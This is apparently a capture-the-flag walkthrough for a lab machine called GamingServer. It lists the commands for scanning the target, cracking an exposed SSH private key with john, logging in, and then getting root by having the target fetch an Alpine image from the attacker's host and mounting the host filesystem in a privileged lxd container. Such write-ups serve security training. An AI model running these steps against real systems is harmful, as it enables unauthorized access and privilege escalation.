# GamingServer

- What is the user flag?

	- Visit `http://<TARGET_IP>`.
	- `scilla port -target <TARGET_IP> -p -1000`
	- Two ports open. 22 and 80.
	- `scilla dir -target <TARGET_IP>`
	~~~
	[+]FOUND: http://<TARGET_IP>/uploads/ 200 OK
	[+]FOUND: http://<TARGET_IP>/secret/ 200 OK
	~~~
	- Found a dictionary of passwords in uploads (dict.lst) and a RSA private key.
	- Save these two files.
	- `python2 /usr/share/john/ssh2john.py rsa_priv > id_rsa.hash`
	- `john -w dict.lst id_rsa.hash`
	- `chmod 600 rsa_priv`
	- `ssh john@<TARGET_IP> -i rsa_priv`. We know the user is john from the website.
	- `ls`
	- `cat user.txt`
	- `*********************************`

- What is the root flag?

	- john is in the `lxd` group.
	- So download the [lxd Alpine Builder](https://github.com/saghul/lxd-alpine-builder).
	- `git clone https://github.com/saghul/lxd-alpine-builder.git`
	- `cd lxd-alpine-builder`
	- `sudo ./build-alpine`
	- `python3 -m http.server`
	- On target `wget http://<YOUR_IP>:8000/alpine-*****************.tar.gz`
	- `lxc image import ./alpine-*****************.tar.gz --alias myimage`
	- `lxc init myimage ignite -c security.privileged=true`
	- `lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true`
	- `lxc start ignite`
	- `lxc exec ignite /bin/sh`
	- `id`
	- `cat /mnt/root/root/root.txt `
	- `********************************`





